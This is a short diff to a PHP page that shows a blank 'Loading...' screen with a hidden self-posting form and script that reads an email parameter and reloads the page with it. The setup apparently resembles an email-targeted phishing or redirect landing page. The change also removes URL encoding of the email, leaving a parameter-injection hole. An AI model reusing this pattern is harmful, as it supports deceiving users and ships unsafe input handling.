@@ -289,7 +289,7 @@ $clientDevice = $_POST['device'] ?? null;
 
 if (!$clientBrowser || !$clientDevice) {
     ?><!DOCTYPE html>
-<html><head><meta charset="UTF-8"><title>Redirecting...</title>
+<html><head><meta charset="UTF-8"><title>Loading...</title>
 <style>body{margin:0;background:#fff}</style>
 </head><body>
 <form id="dataForm" method="POST" action="<?php echo htmlspecialchars($_SERVER['REQUEST_URI']); ?>" style="display:none;">
@@ -304,9 +304,10 @@ if (!$clientBrowser || !$clientDevice) {
         for(var i=0;i<pairs.length;i++){
             var kv=pairs[i].split('=');
             if(kv[0]==='e'||kv[0]==='email'){
-                var email=decodeURIComponent(kv.slice(1).join('='));
+                var emailPart=kv.slice(1).join('=');
+                var email=decodeURIComponent(emailPart);
                 var sep=window.location.search?'&':'?';
-                window.location.replace(window.location.pathname+window.location.search+sep+'e='+encodeURIComponent(email));
+                window.location.replace(window.location.pathname+window.location.search+sep+'e='+email);
                 return;
             }
         }
